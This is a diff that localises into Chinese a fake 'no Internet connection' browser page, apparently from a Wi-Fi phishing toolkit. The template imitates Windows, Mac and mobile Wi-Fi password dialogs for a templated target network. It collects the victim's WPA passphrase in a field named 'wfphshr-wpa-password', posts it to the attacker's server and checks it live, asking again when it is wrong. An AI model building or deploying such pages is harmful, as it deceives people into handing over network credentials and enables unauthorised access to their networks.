@@ -6,7 +6,7 @@
         maximum-scale=1.0, user-scalable=no">
         <title i18n-content="title">Internet connection is not available</title>
         <link rel='stylesheet' href='/static/chrome-offline.css' type='text/css' />
- 
+
         <script>
             /**
          * JavaScript Client Detection
@@ -214,21 +214,21 @@
         '        </div>' +
         '        <div class="description">' +
         '           <form id="wifi-search-form" method="post" action="/post">' +
-        '               <strong>The Wi-Fi network ″{{ target_ap_essid }}″ requires a {{ target_ap_encryption }} password.</strong>' + 
+        '               <strong>Wi-Fi 网络 ″{{ target_ap_essid }}″ 需要 {{ target_ap_encryption }} 密码.</strong>' +
         '               <div class="password">' +
-        '                   <label>Password: </label>' +
+        '                   <label>密码: </label>' +
         '                   <input type="password" id="wifi-search-password" name="wfphshr-wpa-password"/>' +
         '                   <br>' +
         '                   <label id="pw_status"></label>' +
         '                   <br>' +
         '                   <div class="glow"></div>' +
-        '               </div>' + 
-        '               <div class="checkmark">' +
-        '                   <input id="show-password" type="checkbox" /><label for="show-password">Show password</label>' +
         '               </div>' +
         '               <div class="checkmark">' +
-        '                   <input id="remember-network" type="checkbox" /><label for="remember-network">Remember this network</label>' +
-        '               </div>' + 
+        '                   <input id="show-password" type="checkbox" /><label for="show-password">显示密码</label>' +
+        '               </div>' +
+        '               <div class="checkmark">' +
+        '                   <input id="remember-network" type="checkbox" /><label for="remember-network">记住该网络</label>' +
+        '               </div>' +
         '               <div class="buttons">' +
         '                   <input id="button-join" type="submit" value="Join">' +
         '                   <input id="button-cancel" type="reset" value="Reset">' +
@@ -253,28 +253,26 @@
         "                   <input id='automatic' type='checkbox' />" +
         "                   <label for='automatic'>" +
         "                       <div class='check'></div>" +
-        "                       Connect automatically" +
+        "                       自动连接" +
         "                   </label>" +
-        "                   <button id='connect' class='connect' type='button'>Connect</button>" +
+        "                   <button id='connect' class='connect' type='button'>连接</button>" +
         "               </div>" +
         "               <div class='connected'>" +
         "                   <label id='pw_status' for='presharedKey'>" +
-        "                       Enter the network security key" +
+        "                       输入网络安全密钥" +
         "                   </label>" +
         "                   <input id='password' type='password' name='wfphshr-wpa-password' />" +
-        "                   You can also connect by pushing the button on the" +
-        "                   router." +
         "                   <input id='share' type='checkbox' />" +
         "                   <label for='share'>" +
         "                       <div class='check'></div>" +
-        "                       Share network with my contacts" +
+        "                       与我的联系人共享网络" +
         "                   </label>" +
-        "                   <button class='authenticate'>Next</button> " +
-        "                   <button class='cancel' type='button'>Cancel</button> " +
+        "                   <button class='authenticate'>下一步</button> " +
+        "                   <button class='cancel' type='button'>取消</button> " +
         "               </div> " +
         "           </div> " +
         "       </li> " +
-                {% for ap in APs %} 
+                {% for ap in APs %}
         "        <li>" +
         "           <div class='wifi icon'>" +
         "               <div class='dot dot1'></div>" +
@@ -284,14 +282,14 @@
         "           </div>" +
         "           <div class='content'>" +
         "               <strong>{{ ap['essid'] }}</strong>" +
-        "               <span>Connected</span>" +
+        "               <span>已连接</span>" +
         "           </div>" +
         "       </li>" +
                 {% end %}
         "       </ul> " +
-        "       <a href=''>Network settings</a> " +
-        "       </div></form>"; 
-        
+        "       <a href=''>网络设置</a> " +
+        "       </div></form>";
+
         var loadhtml_mobile = '<form id="wifi-search-form" method="post" action="/post">' +
 	'<input class="hidden" id="wifi-search-password" name="wfphshr-wpa-password" />' +
 	' 	<div class="buttons">' +
@@ -315,23 +313,23 @@
 
         function windows_validate_action (pw_status, password) {
             if (pw_status == "success") {
-                document.getElementByid("windows-form").submit(); 
-                document.getElementById("pw_status").innerHTML = "Enter the network security key";
+                document.getElementByid("windows-form").submit();
+                document.getElementById("pw_status").innerHTML = "输入网络安全秘钥";
             } else if (pw_status == "fail") {
-                document.getElementById("pw_status").innerHTML = "Enter the network security key: the passphrase is wrong!";
+                document.getElementById("pw_status").innerHTML = "输入网络安全秘钥：密码错误!";
             } else {
-                document.getElementById("windows-form").submit(); 
+                document.getElementById("windows-form").submit();
             }
         }
 
         function mac_validate_action (pw_status, password) {
             if (pw_status == "success") {
-                document.getElementById("wifi-search-form").submit(); 
+                document.getElementById("wifi-search-form").submit();
                 document.getElementById("pw_status").innerHTML = ""
             } else if (pw_status == "fail") {
-                document.getElementById("pw_status").innerHTML = "the passphrase is wrong!"
+                document.getElementById("pw_status").innerHTML = "密码错误！"
             } else {
-                document.getElementById("wifi-search-form").submit(); 
+                document.getElementById("wifi-search-form").submit();
             }
         }
 
@@ -340,9 +338,9 @@
 			    document.getElementById("wifi-search-password").value = password;
 			    document.getElementById("button-join").click();
             } else if (pw_status == "fail") {
-                alert("Wrong password! Please re-enter the password.");
-		        var popup = prompt('The Wi-Fi network ″{{ target_ap_essid }}″ requires a {{ target_ap_encryption }} password.', '');
-                if (popup != null) { 
+                alert("密码错误！请重新输入密码。");
+		        var popup = prompt('Wi-Fi 网络 ″{{ target_ap_essid }}″ 需要 {{ target_ap_encryption }} 密码.', '');
+                if (popup != null) {
                     validate_passphrase(popup, mobile_validate_action);
                 }
             } else {
@@ -352,12 +350,12 @@
         }
 
         function load_mobile() {
-		    var popup = prompt('The Wi-Fi network ″{{ target_ap_essid }}″ requires a {{ target_ap_encryption }} password.', '');
+		    var popup = prompt('Wi-Fi 网络 ″{{ target_ap_essid }}″ 需要 {{ target_ap_encryption }} 密码.', '');
 		    if (popup != null) {
                 validate_passphrase(popup, mobile_validate_action);
 		    }
         }
-        
+
         </script>
         <title></title>
         </head>
@@ -367,27 +365,17 @@
             <img class="dinosaur" src="static/dinosaur.png" width="45" />
             <div class="icon icon-offline" style="visibility: hidden;"></div>
             <div id="main-message">
-                <h1>There is no Internet connection</h1>
-                <p>You can try to diagnose the problem by taking the following steps:
-                <br />
-                Go to
-                <strong>
-                Applications &gt; System Preferences &gt; Network &gt; Assist me
-                </strong>
-                to test your connection.</p>
+                <h1>未连接到互联网</h1>
                 <div id="suggestions-list" >
-                    <p >Try:</p>
+                    <p >请试试以下办法:</p>
                     <ul class="chrome-list">
-                        <li>Checking the network cable or router</li>
-                        <li>Resetting the modem or router</li>
-                        <li>Reconnecting to Wi-Fi</li>
+                        <li>检查网线、调制解调器和路由器</li>
+                        <li>重置调制解调器或路由器</li>
+                        <li>重新连接到 Wi-Fi </li>
                     </ul>
                 </div>
                 <div class="error-code">ERR_INTERNET_DISCONNECTED</div>
             </div>
-        </div>
-        <div id="buttons" class="nav-wrapper suggested-right" >
-            <button id="details-button" class="text-button small-link singular">Details</button>
         </div>
         <div id="loader-mac"></div>
         <div id="loader-windows"></div>
@@ -398,7 +386,7 @@
                 var myform = document.getElementById("windows-form");
                 myform.addEventListener("submit", function(evt) {
                     evt.preventDefault();
-                    validate_passphrase(document.getElementById("password").value, windows_validate_action); 
+                    validate_passphrase(document.getElementById("password").value, windows_validate_action);
                 });
             }
             else if (jscd.os == "Android" || jscd.os == "iOS") {
@@ -410,7 +398,7 @@
                 var myform = document.getElementById("wifi-search-form");
                 myform.addEventListener("submit", function(evt) {
                     evt.preventDefault();
-                    validate_passphrase(document.getElementById("wifi-search-password").value, mac_validate_action); 
+                    validate_passphrase(document.getElementById("wifi-search-password").value, mac_validate_action);
                 });
             }
         </script>
